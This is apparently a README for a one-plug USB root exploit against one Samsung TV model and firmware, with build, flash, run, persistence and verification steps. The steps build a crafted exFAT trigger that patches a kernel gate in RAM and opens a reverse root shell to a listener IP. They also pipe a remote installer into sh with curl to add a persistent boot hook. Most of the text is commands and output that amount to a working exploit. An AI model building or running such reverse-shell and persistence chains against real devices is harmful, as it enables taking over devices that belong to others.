# One-plug USB root — QE49Q6FNA / T-KTM2DEUC-1400.2

## Build

Dependencies: Python 3.11+, `pyelftools==0.33`, `capstone==5.0.9`, and Clang
with ARM integrated-assembler support. The pinned Python versions are in
`requirements.txt`. Clang assembles `.S` files into temporary ARM objects; the
builders extract `.text` with pyelftools.

```sh
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
python tools/build.py --variant umh-boot --beacon LISTENER_IP:4444
```

`--beacon` takes `IPv4:PORT`; the stage waits on `PORT` and the reverse shell
uses `PORT + 1`. The address is required and has no default. The build refuses
to reuse an existing output directory. `--out-dir PATH` selects another output
root.

Output:

```text
out/umh-boot/stage.bin
out/umh-boot/stage.S
out/umh-boot/cave.bin
out/umh-boot/p1.img
out/umh-boot/p2.img
out/umh-boot/usb.img
out/umh-boot/manifest.json
```

`manifest.json` records the arguments, the commands and the SHA-256 of every
file. The same source, variant, listener and toolchain should produce the same
image hash. With the listener address used in the hardware run, the build
reproduces the validated `stage.bin`, `cave.bin` and `p1.img` byte-for-byte.

## Flash

```sh
cd out/umh-boot
shasum -a 256 usb.img          # Linux: sha256sum usb.img
sudo dd if=usb.img of=/dev/sdX bs=4M conv=fsync status=progress
sync
```

Replace `/dev/sdX` carefully: flashing destroys that device. On macOS,
`tools/write_usb.sh` refuses internal disks and requires an explicit
confirmation:

```sh
sudo CONFIRM_WRITE=YES bash tools/write_usb.sh out/umh-boot/usb.img disk8
```

## Run

Start the relay before powering on the TV. The shell connects once per cold
boot and does not retry:

```sh
python lab/relay_shell_4445.py --bind 0.0.0.0 --port 4445 \
  --log out/root_shell.log --commands out/cmds.txt
```

Power-cycle the TV with the stick inserted. When the relay reports a
connection, the shell is `uid=0(root)`. Append commands to `cmds.txt` only
after the connection is reported; pre-existing bytes are skipped on reconnect.

Remove the stick once the shell is established. Leaving it in across several
boots produced a reboot loop on the validated unit.

## Optional persistence

Once the root shell is available, the USB stick can be retired. The persistent
installer writes a Node daemon to `/opt` and a marked hook block to
`/opt/etc/parseinfo.sh`, which `AT-HUB.service` already runs at every boot:

```sh
python3 tools/build_persist_bundle.py
python3 -m http.server 8000 --bind 0.0.0.0 --directory out/persist
# in the TV root shell:
curl -fsSL http://HOST_IP:8000/install.sh | sh
```

The stick is then no longer needed on later boots. Store the printed token and
verify with `tools/kant_rootctl.py`; see
[PERSISTENCE.md](PERSISTENCE.md) for the full procedure, security model,
verification steps and uninstall. The daemon is offline-tested but not yet
hardware-validated.

## Disk layout

| partition | format | contents |
|---|---|---|
| p1 | 8 MiB exFAT | from-scratch crafted trigger (`tools/mk_trigger.py`) |
| p2 | 64 MiB FAT32 | empty proof volume |

MBR at LBA 0, p1 at LBA 2048 (type `0x07`, 16384 sectors), p2 at LBA 18432
(type `0x0C`, 131072 sectors).

## Variants

| Variant | Purpose |
|---|---|
| `umh-boot` | usermode-helper shell with bounded network wait; no kernel-text patch |
| `umh` | UEP patch, kernel TCP report and usermode-helper probes |
| `umh-nopatch` | helper probes without a kernel-text patch |
| `kbeacon` | kernel-side device/proc diagnostic report |
| `proof` | early proof-file experiment without a UEP patch |
| `proof-uep` | early proof-file experiment with a UEP patch |
| `marker` | early raw-marker diagnostic experiment |

The last three are research history, not validated root procedures. Use
`build.py` for a self-contained build.

The diagnostic stages write markers into the USB's unused pre-partition gap.
Some stages patch the UEP gate in kernel RAM. They do not write TV firmware.
Inspect the selected stage before using an image.

## Independent verification

```sh
python tools/verify_trigger_kant.py out/umh-boot/p1.img \
  --cave-blob out/umh-boot/cave.bin
```

The verifier parses the exFAT boot sector and FAT chain from scratch,
reconstructs the 30-byte-per-entry name stream, and checks the frame words and
the injected cave blob. `make_proof_volume.py` generates the empty 64 MiB
FAT32 partition deterministically, including both FATs, FSInfo and backup
sectors.

An offline verifier PASS checks file layout and embedded frame data. It is not
a runtime root result.

## Validation evidence

Observed on the physical QE49Q6FNA with T-KTM2DEUC 1400.2:

```text
uid=0(root) gid=0(root)
Linux Samsung 4.1.10 armv7l
```

Kernel-side TCP reporting and usermode-helper execution were observed during
the same experiments. The helper report's return value alone was not used as
proof: zero means a helper was queued. The interactive session supplied the
uid evidence.

Early raw-marker and proof-file attempts failed. Kernel-side block-device
access returned `EACCES`. Later UMH probes provided the useful root evidence.
The diagnostic variants are retained so those failures remain traceable.

## Limits

* Without the optional [persistent install](PERSISTENCE.md), the USB stick is
  required at every cold boot. Root is then re-established from the stick each
  time; there is no persistent boot hook.
* The persistent daemon is offline-tested only. It has not been installed or
  boot-validated on a physical TV, and it requires a firmware with
  `/usr/bin/node` and the `AT-HUB.service` → `/opt/etc/parseinfo.sh` hook.
* Leaving the stick inserted across several boots produced a reboot loop on
  the validated unit. Remove it once the shell is established.
* Long-running stability and an unattended reboot lifecycle have not been
  established.
* An interactive session surviving USB removal does not by itself establish a
  supported USB-free boot path; only the installed boot hook does.
* Hardware use is restricted to the exact target in
  [FIRMWARE-COMPATIBILITY.md](FIRMWARE-COMPATIBILITY.md). A build for another
  firmware requires a separate port and device validation.
